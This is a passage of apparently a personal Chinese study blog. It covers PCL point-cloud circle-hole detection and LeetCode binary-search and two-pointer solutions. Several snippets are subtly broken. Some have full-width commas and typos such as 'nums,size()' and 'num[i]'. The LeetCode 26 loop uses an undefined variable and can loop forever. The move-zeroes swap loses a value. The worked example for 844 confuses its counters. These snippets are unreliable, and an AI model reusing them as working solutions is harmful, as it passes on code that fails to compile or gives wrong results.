pcl::ExtractIndices&lt;pcl::PointXYZ&gt;extract;</span><br><span class="line">    extract.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">    extract.<span class="built_in">setIndices</span>(indexes);</span><br><span class="line">    extract.<span class="built_in">setNegative</span>(<span class="literal">true</span>);</span><br><span class="line">    extract.<span class="built_in">filter</span>(*cloud);<span class="comment">//保存点云</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-5代码实现"><a href="#2-5代码实现" class="headerlink" title="2.5代码实现"></a>2.5代码实现</h2><p>代码汇总：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/sample_consensus/sac_model_circle3d.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/segmentation/extract_clusters.h&gt;</span><span class="comment">//提取聚类</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/crop_box.h&gt;</span><span class="comment">//包围盒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/segmentation/sac_segmentation.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/extract_indices.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExtractCircle</span><span class="params">(<span class="type">const</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr &amp;cloud)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">kd_tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">        kd_tree-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">        <span class="comment">//聚类</span></span><br><span class="line">        std::vector&lt;pcl::PointIndices&gt;cluster_indices;</span><br><span class="line">        pcl::EuclideanClusterExtraction&lt;pcl::PointXYZ&gt;ec;</span><br><span class="line">        ec.<span class="built_in">setClusterTolerance</span>(<span class="number">0.2</span>);</span><br><span class="line">        ec.<span class="built_in">setMinClusterSize</span>(<span class="number">20</span>);</span><br><span class="line">        ec.<span class="built_in">setMaxClusterSize</span>(cloud-&gt;<span class="built_in">size</span>());</span><br><span class="line">        ec.<span class="built_in">setSearchMethod</span>(kd_tree);</span><br><span class="line">        ec.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">        ec.<span class="built_in">extract</span>(cluster_indices);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//RANSAC拟合</span></span><br><span class="line">        pcl::SACSegmentationFromNormals&lt;pcl::PointXYZ,pcl::Normal&gt;seg;</span><br><span class="line">        pcl::<span class="function">ModelCoefficients::Ptr <span class="title">coefficients</span> <span class="params">(<span class="keyword">new</span> pcl::ModelCoefficients)</span></span>;<span class="comment">//创建索引对象</span></span><br><span class="line">        pcl::<span class="function">PointIndices::Ptr <span class="title">inliers</span> <span class="params">(<span class="keyword">new</span> pcl::PointIndices)</span></span>;</span><br><span class="line">        std::vector&lt;pcl::ModelCoefficients&gt;coeff;</span><br><span class="line">    </span><br><span class="line">        <span class="type">int</span> counti=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp; indices : cluster_indices)</span><br><span class="line">        &#123;</span><br><span class="line">                pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cluster</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cloud_cir</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::<span class="built_in">copyPointCloud</span>(*cloud,indices.indices,*cluster);</span><br><span class="line">                pcl::PointCloud&lt;pcl::Normal&gt;::<span class="function">Ptr <span class="title">normals</span> <span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::Normal&gt;)</span></span>;</span><br><span class="line">            	<span class="comment">//	估计法向量</span></span><br><span class="line">                pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::NormalEstimation&lt;pcl::PointXYZ, pcl::Normal&gt; ne;</span><br><span class="line">                ne.<span class="built_in">setInputCloud</span>(cluster);</span><br><span class="line">                ne.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">                ne.<span class="built_in">setRadiusSearch</span>(<span class="number">0.01</span>);</span><br><span class="line">                ne.<span class="built_in">compute</span>(*normals);</span><br><span class="line">				<span class="comment">//RANSAC</span></span><br><span class="line">                seg.<span class="built_in">setOptimizeCoefficients</span>(<span class="literal">true</span>);</span><br><span class="line">                seg.<span class="built_in">setModelType</span>(pcl::SACMODEL_CIRCLE3D);<span class="comment">//拟合3D圆</span></span><br><span class="line">                seg.<span class="built_in">setMethodType</span>(pcl::SAC_RANSAC);<span class="comment">//RANSAC</span></span><br><span class="line">                seg.<span class="built_in">setNormalDistanceWeight</span>(<span class="number">0.9</span>);<span class="comment">//法向量权重</span></span><br><span class="line">                seg.<span class="built_in">setMaxIterations</span>(<span class="number">10000</span>);<span class="comment">//设置最大迭代次数</span></span><br><span class="line">                seg.<span class="built_in">setDistanceThreshold</span>(<span class="number">0.1</span>);<span class="comment">//eps</span></span><br><span class="line">                seg.<span class="built_in">setRadiusLimits</span>(<span class="number">1.5</span>,<span class="number">3</span>);<span class="comment">//添加拟合圆的半径限制，防止拟合过大或过小的圆</span></span><br><span class="line">                seg.<span class="built_in">setInputNormals</span>(normals);<span class="comment">//输入法向量</span></span><br><span class="line">                seg.<span class="built_in">setInputCloud</span>(cluster);<span class="comment">//传入点集</span></span><br><span class="line">                seg.<span class="built_in">segment</span>(*inliers,*coefficients);<span class="comment">//分割</span></span><br><span class="line">            	<span class="comment">//拟合圆的点数限制，因为很容易会拟合半圆，需根据实际的需求调整，防止拟合半圆</span></span><br><span class="line">                <span class="keyword">if</span> (inliers-&gt;indices.<span class="built_in">size</span>() &lt; <span class="number">80</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="comment">//cerr&lt;&lt;&quot;none&quot;&lt;&lt;endl;</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                coeff.<span class="built_in">push_back</span>(*coefficients);</span><br><span class="line">                counti++;</span><br><span class="line">            	<span class="comment">//提取</span></span><br><span class="line">                pcl::ExtractIndices&lt;pcl::PointXYZ&gt; extract;</span><br><span class="line">                extract.<span class="built_in">setInputCloud</span>(cluster);</span><br><span class="line">                extract.<span class="built_in">setIndices</span>(inliers);</span><br><span class="line">                extract.<span class="built_in">setNegative</span>(<span class="literal">false</span>);</span><br><span class="line">                extract.<span class="built_in">filter</span>(*cloud_cir);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; coeff.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            	<span class="comment">//提取拟合圆环的中心点坐标</span></span><br><span class="line">                <span class="function">Eigen::Vector3f <span class="title">center</span><span class="params">(coeff.at(i).values[<span class="number">0</span>],coeff.at(i).values[<span class="number">1</span>],coeff.at(i).values[<span class="number">2</span>])</span></span>;</span><br><span class="line">            	<span class="comment">//设置分割的包围盒长宽高，圆环的半径+阈值</span></span><br><span class="line">                <span class="type">float</span> length0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>,width0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>, height0 = <span class="number">5.0</span>;</span><br><span class="line">                <span class="function">Eigen::Vector4f <span class="title">min_pt</span><span class="params">(center.x()-(length0),center.y()-(width0),center.z()-(height0),<span class="number">0</span>)</span></span>;<span class="comment">//半径</span></span><br><span class="line">                <span class="function">Eigen::Vector4f <span class="title">max_pt</span><span class="params">(center.x()+(length0),center.y()+(width0),center.z()+(height0),<span class="number">0</span>)</span></span>;</span><br><span class="line">				</span><br><span class="line">            	<span class="comment">//创建包围盒对象</span></span><br><span class="line">                pcl::CropBox&lt;pcl::PointXYZ&gt;crop;</span><br><span class="line">                crop.<span class="built_in">setMin</span>(min_pt);<span class="comment">//输入最小坐标</span></span><br><span class="line">                crop.<span class="built_in">setMax</span>(max_pt);<span class="comment">//最大坐标</span></span><br><span class="line">                crop.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">                crop.<span class="built_in">setKeepOrganized</span>(<span class="literal">false</span>);<span class="comment">//提取被删除点的索引则为true</span></span><br><span class="line">                crop.<span class="built_in">setUserFilterValue</span>(<span class="number">0.1f</span>);<span class="comment">//</span></span><br><span class="line">                <span class="function">pcl::IndicesPtr <span class="title">indexes</span><span class="params">(<span class="keyword">new</span> std::vector&lt;<span class="type">int</span>&gt;)</span></span>;</span><br><span class="line">                crop.<span class="built_in">filter</span>(*indexes);</span><br><span class="line">				<span class="comment">//创建分割对象</span></span><br><span class="line">                pcl::ExtractIndices&lt;pcl::PointXYZ&gt;extract;</span><br><span class="line">                extract.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">                extract.<span class="built_in">setIndices</span>(indexes);</span><br><span class="line">                extract.<span class="built_in">setNegative</span>(<span class="literal">true</span>);</span><br><span class="line">                extract.<span class="built_in">filter</span>(*cloud);<span class="comment">//保存点云</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-6结果"><a href="#2-6结果" class="headerlink" title="2.6结果"></a>2.6结果</h2><p><strong>RANSAC搜索的对象</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806155049673.png" alt="image-20230806155049673" style="zoom:80%;">

<p><strong>包围盒分割图像</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806155158365.png" alt="image-20230806155158365" style="zoom:80%;">]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>点云</tag>
        <tag>滤波</tag>
        <tag>特征识别</tag>
      </tags>
  </entry>
  <entry>
    <title>二分查找法</title>
    <url>/2023/09/05/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%E6%B3%95/</url>
    <content><![CDATA[<h1 id="二分查找法"><a href="#二分查找法" class="headerlink" title="二分查找法"></a>二分查找法</h1><ul>
<li>对应<a href="https://leetcode.cn/problems/binary-search/description/">704. 二分查找 - 力扣（LeetCode）</a></li>
<li>升序数组-二分查找-主要思路是分清搜索区间，左闭右闭，还是左闭右开。</li>
<li><strong>区间的开闭</strong>用来判断<code>while</code>的判断条件以及<code>left</code>，<code>right</code>的更新条件。</li>
</ul>
<hr>
<h2 id="1-leetcode-704-二分查找"><a href="#1-leetcode-704-二分查找" class="headerlink" title="1.leetcode-704-二分查找"></a>1.leetcode-704-二分查找</h2><ul>
<li><p><strong>左闭右闭</strong><code>[left, right]</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> left = <span class="number">0</span>， right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="comment">// while &lt;= 可以想象[1, 1]其中的1 是有效数字</span></span><br><span class="line"><span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">    <span class="type">int</span> middle = left + ((right - left) / <span class="number">2</span>);<span class="comment">//防止溢出</span></span><br><span class="line">    <span class="keyword">if</span>(nums[middle] &gt; target)&#123;</span><br><span class="line">        right = middle - <span class="number">1</span>;<span class="comment">//middle的值已经在if中判断过，所以不需要包含middle</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[middle] &lt; target)&#123;</span><br><span class="line">        left = middle + <span class="number">1</span>;<span class="comment">//同理</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">return</span> middle;<span class="comment">//相等则返回 middle</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//不存在target</span></span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>左闭右开</strong><code>[left, right)</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> left = <span class="number">0</span>， right = nums.<span class="built_in">size</span>();<span class="comment">//右边为开区间</span></span><br><span class="line"><span class="comment">// while &lt; 可以想象[1, 1)其中的1不合法</span></span><br><span class="line"><span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">    <span class="type">int</span> middle = left + ((right - left) / <span class="number">2</span>);<span class="comment">//防止溢出</span></span><br><span class="line">    <span class="keyword">if</span>(nums[middle] &gt; target)&#123;</span><br><span class="line">        right = middle;<span class="comment">//middle的值本来就不包含在区间内</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[middle] &lt; target)&#123;</span><br><span class="line">        left = middle + <span class="number">1</span>;<span class="comment">//左闭</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">return</span> middle;<span class="comment">//相等则返回 middle</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//不存在target</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-leetcode-2594-修车最少时间"><a href="#2-leetcode-2594-修车最少时间" class="headerlink" title="2.leetcode-2594-修车最少时间"></a>2.leetcode-2594-修车最少时间</h2><p>题目：<a href="https://leetcode.cn/problems/minimum-time-to-repair-cars/description/?envType=daily-question&envId=2023-09-07">2594. 修车的最少时间 - 力扣（LeetCode）</a></p>
<p>求修车最少时间，先考虑二分法，若解的值域范围内有单调性，就可以使用二分：</p>
<ul>
<li>​	假设t分钟内可以将所有的汽车都修理完，那么大于t分钟也是可行的。</li>
<li>​	假设t分组内不能将所有的汽车都修理完，那么小于t分钟也是不能够的。</li>
</ul>
<p>因此可以枚举一个时间<code>t</code>，那么能力值为<code>r</code>的工人可以修好<code>sqrt(t/r)</code>量汽车，<strong>若所有工人修完的汽车数量大于<code>cars</code>，那么调整右边界为<code>t</code>，否则调整左边界为<code>t+1</code></strong>.</p>
<p>上界可取正无穷。类似与左闭右开</p>
<p><strong>左右区间更新：</strong>为什么右区间更新为<code>m</code>，左区间更新为<code>m + 1</code>？</p>
<ul>
<li>当 <code>check(m)</code> 返回 <code>true</code> 时，<strong>表示当前中间值 <code>m</code> 是一个可能的解</strong>，因此我们将右边界 <code>r</code> 更新为 <code>m</code>。这是因为我们要尝试找到更小的值，以确保我们找到的是最小的满足条件的值。</li>
<li>当 <code>check(m)</code> 返回 <code>false</code> 时，<strong>表示当前中间值 <code>m</code> 不是一个解</strong>，因此我们将左边界 <code>l</code> 更新为 <code>m + 1</code>。这是因为我们知道 <code>m</code> 不是解，所以我们需要将搜索范围向右移动到更大的值，以便寻找可能的解。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">repairCars</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ranks, <span class="type">int</span> cars)</span> </span>&#123;</span><br><span class="line">    ll l = <span class="number">1</span>, r = <span class="number">1ll</span> * ranks[<span class="number">0</span>] * cars * cars;<span class="comment">//左边界为1，右边界为足够大的数-一个工人修完车的时间</span></span><br><span class="line">    <span class="comment">//lambda函数，用于检查给定的时间是否足够来修理至少cars辆汽车</span></span><br><span class="line">    <span class="comment">//[&amp;]表示按引用的方式捕获外部的变量，这里主要是为了要使用ranks</span></span><br><span class="line">    <span class="keyword">auto</span> check = [&amp;](ll m) &#123;</span><br><span class="line">        ll cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : ranks) &#123;</span><br><span class="line">            cnt += <span class="built_in">sqrt</span>(m / x);<span class="comment">//累加当前时间下计算总共修了多少辆汽车</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> cnt &gt;= cars;<span class="comment">//比较能否修理完cars辆汽车，可以则返回true</span></span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="comment">//修车时间二分</span></span><br><span class="line">	<span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="comment">//m：中间值</span></span><br><span class="line">        ll m = l + r &gt;&gt; <span class="number">1</span>;<span class="comment">//&gt;&gt;1：右移一位相当于除以二</span></span><br><span class="line">        <span class="comment">//check==1则更新右边界，边界可以修的完</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(m)) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//更新左边界，边界修不完</span></span><br><span class="line">            l = m + <span class="number">1</span>;<span class="comment">//类似于左边右开 m的值已经判断过所欲不需要继续判断</span></span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> l;<span class="comment">//返回修车最小时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>二分法</tag>
        <tag>数组</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>数组双指针</title>
    <url>/2023/09/06/%E6%95%B0%E7%BB%84%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><p>Leetcode-27移除元素：<a href="https://leetcode.cn/problems/remove-element/">27. 移除元素 - 力扣（LeetCode）</a></p>
<p><strong>相似题目：</strong></p>
<p><a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">26. 删除有序数组中的重复项 - 力扣（LeetCode）</a></p>
<p><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零 - 力扣（LeetCode）</a></p>
<p><a href="https://leetcode.cn/problems/backspace-string-compare/">844. 比较含退格的字符串 - 力扣（LeetCode）</a>、</p>
<p><a href="https://leetcode.cn/problems/squares-of-a-sorted-array/">977. 有序数组的平方 - 力扣（LeetCode）</a></p>
<p><strong>关键知识点：</strong></p>
<ul>
<li>数组删除元素本质是<strong>覆盖</strong></li>
<li><code>vector</code>中<code>erase</code> 是<code>O(n)</code>的操作</li>
</ul>
<h2 id="1-leetcode-27"><a href="#1-leetcode-27" class="headerlink" title="1.leetcode-27"></a>1.leetcode-27</h2><p>双指针：一层for循环</p>
<ol>
<li><p><strong>快慢指针</strong>-可以不改变原来数组的位置</p>
<p>快指针：获取新数组的元素的指针，若当时指针的值指向为要覆盖的元素则跳过。</p>
<p>慢指针：需要覆盖的位置的指针。</p>
<p>相对于一个是前方的探子<code>fast</code>，一个在后方部署策略<code>slow</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> slow = <span class="number">0</span>；</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> fast = <span class="number">0</span>; fast &lt; nums.<span class="built_in">size</span>(); fast++)&#123;</span><br><span class="line">	<span class="comment">//判断是否是要覆盖的值</span></span><br><span class="line">    <span class="keyword">if</span>(nums[fast] != val)&#123;</span><br><span class="line">        nums[slow] = nums[fast];<span class="comment">//更新新数组</span></span><br><span class="line">        slow++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> slow;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>左右指针</strong></p>
<p><code>left</code>指针用于判断当前元素是否是需要覆盖的元素，如果是的话则用<code>right</code>指针指向的元素进行覆盖，并对<code>right</code>进行<code>--</code>，如果不是则进行<code>++</code>迭代。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> left = <span class="number">0</span>, right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[left] == val)&#123;</span><br><span class="line">        nums[left] = num[right];</span><br><span class="line">        right--;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        left++;<span class="comment">//不是target元素则自加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> left;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="2-leetcode-26"><a href="#2-leetcode-26" class="headerlink" title="2.leetcode-26"></a>2.leetcode-26</h2><p>题目要求<strong>删除重复元素且不改变相对顺序</strong>。</p>
<p>快指针：寻找新数组的元素。</p>
<p>慢指针：新数组元素的集合。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> slow = <span class="number">0</span>, fast = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (right &lt; nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">    <span class="comment">//当数组中快慢指针指向元素相等时，快指针++</span></span><br><span class="line">    <span class="keyword">if</span> (nums[slow] == nums[fast])&#123;</span><br><span class="line">        fast++;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//快慢指针指向元素不相等时，则慢指针保留快指针的元素</span></span><br><span class="line">        nums[++slow] = nums[fast];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> slow + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>



<h2 id="3-leetcode-283-移动零"><a href="#3-leetcode-283-移动零" class="headerlink" title="3.leetcode-283 移动零"></a>3.leetcode-283 移动零</h2><p>将数组的所有<code>0</code>元素移动到数组末尾，保持非零元素的顺序。</p>
<p>快指针：待处理数组元素，遇到非0的元素则进行交换</p>
<p>慢指针：新的数组，慢指针左边均为非零的数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> slow = <span class="number">0</span>, fast = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (fast &lt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[fast] != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//进行快慢指针元素替换</span></span><br><span class="line">        <span class="type">int</span> temp = nums[slow];</span><br><span class="line">        nums[slow] = nums[fast];</span><br><span class="line">        nums[fast] = nums[slow];</span><br><span class="line">        slow++;</span><br><span class="line">    &#125;</span><br><span class="line">    fast++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-leetcode-844-比较含退格的字符串"><a href="#4-leetcode-844-比较含退格的字符串" class="headerlink" title="4.leetcode-844 比较含退格的字符串"></a>4.leetcode-844 比较含退格的字符串</h2><ul>
<li>题目：文本中含有退格符<code>#</code>比较两个字符串是否相等</li>
<li>思路：<strong>逆序遍历，退格符只会影响前一个字符</strong>。并且用<code>skip</code>表示带删除字符的数量</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = s.<span class="built_in">size</span>() - <span class="number">1</span>, j = t.<span class="built_in">size</span>() - <span class="number">1</span>, skipS = <span class="number">0</span>, skipT = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//s字符串的逆序遍历</span></span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            skipS++;<span class="comment">//需要删除字符+1</span></span><br><span class="line">        	i--;<span class="comment">//遍历字符减一</span></span><br><span class="line">    	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(skipS &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        	skipS--;<span class="comment">//若skip不为0 则说明当前字符需要删去</span></span><br><span class="line">        	i--;</span><br><span class="line">    	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//退出循环的唯一条件</span></span><br><span class="line">       	 	<span class="keyword">break</span>;<span class="comment">//如果既不为‘#’且skip=0，则跳出循环进行比较</span></span><br><span class="line">    	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//同理</span></span><br><span class="line">    <span class="keyword">while</span>(j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t[j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            skipT++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (skipT &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            skipT--;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] != t[j])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//不相等则返回false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//至少有一个出界</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    i--;<span class="comment">//判断完进行迭代</span></span><br><span class="line">    j--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p><strong>举个栗子：</strong></p>
<p><code>s-&gt;&quot;a##c&quot;</code>和<code>t-&gt;&quot;#a#c&quot;</code></p>
<ol>
<li>第一次循环，两个指针均指向<code>c</code>相等，则进行<code>i--（i = 2）</code>和<code>j--</code></li>
<li>第二次循环<code>s</code>字符串为<code>#</code>，<code>skipT++(1)</code>，<code>i--（i = 1）</code>，进入子循环，依然为<code>#</code>，<code>skipT++(2)</code>和<code>i--(0)</code> ，然后因为<code>skipT &gt;= 0</code>,所以进入 <code>skipT--(1)</code>和<code>i--(-1)</code>，然后退出子<code>while</code></li>
<li>t字符串同理，最后返回<code>true</code></li>
</ol>
<h2 id="5-leetcode-977有序数组的平方"><a href="#5-leetcode-977有序数组的平方" class="headerlink" title="5.leetcode-977有序数组的平方"></a>5.leetcode-977有序数组的平方</h2><p>题目：nums为非递减顺序的数组，要求返回每个数字平方组成的新数组，也为非递减顺序。</p>
<p>法一：用库函数<code>sort()</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = nums,<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    nums[i] *= num[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">return</span> nums;</span><br></pre></td></tr></table></figure>

<p>法二：利用题目中已按照升序排序这个条件 双指针 <strong>用时间换空间</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>, pos = n - <span class="number">1</span>; i &lt;= j;) &#123;</span><br><span class="line">    <span class="comment">//前后两个元素比较，若前这元素大于后面的则把放在后面</span></span><br><span class="line">    <span class="keyword">if</span>(nums[i] * nums[i] &gt; nums[j] * nums[j]) &#123;</span><br><span class="line">        ans[pos] = nums[i] * nums[i];</span><br><span class="line">        ++i;<span class="comment">//前面元素放在了后面 所以前面进行更新</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        ans[pos] = nums[j] * nums[j];<span class="comment">//反之同理</span></span><br><span class="line">        --j;</span><br><span class="line">    &#125;</span><br><span class="line">    --pos;<span class="comment">//ans元素进行迭代</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;<span class="comment">//用时间换空间</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>leetcode</tag>
        <tag>双指针法</tag>
      </tags>
  </entry>
  <entry>
    <title>双指针-滑动窗口</title>
